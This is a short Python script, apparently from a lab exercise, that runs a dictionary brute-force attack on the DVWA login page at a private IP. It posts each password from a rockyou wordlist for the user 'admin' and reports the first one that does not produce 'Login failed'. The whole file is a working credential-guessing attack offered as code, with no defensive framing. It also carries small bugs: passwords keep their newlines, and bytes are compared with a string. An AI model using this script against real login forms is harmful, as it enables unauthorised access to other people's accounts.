#!/usr/bin/env python
import requests

def login(user,password,url):
    data ={"username": user, "password": password, "Login":"submit" }
    return requests.post(url, data=data, allow_redirects=True)


error_login= "Login failed"
dictionary= "rockyou-20.txt"
user= "admin"
target_url="http://10.0.9.6/dvwa/login.php"

with open(dictionary, "r") as wordlist_file:
    for password in wordlist_file:
        response =login(user,password,target_url)
        #print(response.content)
        if error_login not in response.content:
            print("\t [+] login succes with credentials ==> "+password)
            exit()